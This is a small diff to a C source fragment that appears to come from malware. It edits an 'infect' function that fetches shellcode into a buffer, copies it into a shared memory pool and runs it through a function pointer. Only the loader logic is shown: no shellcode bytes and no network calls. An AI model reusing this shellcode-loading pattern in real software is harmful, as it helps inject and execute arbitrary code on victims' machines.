@@ -1,7 +1,5 @@
-#include <stdlib.h>
-#include <stdio.h>
-#include <spawner.h>
 #include <string.h>
+#include <repnmem.h>
 
 extern void *spawn_pool;
 
@@ -29,17 +27,14 @@ get_shellcode(char **buf)
 void
 infect(void)
 {
+    void (*func)(void);
     char *buf = NULL;
     unsigned len;
 
 
-    printf("[*] %s\n", __FUNCTION__);
-
     len = get_shellcode(&buf);
 
     memcpy(spawn_pool, buf, len);
-
-    void (*func)(void);
 
     func = spawn_pool;
 
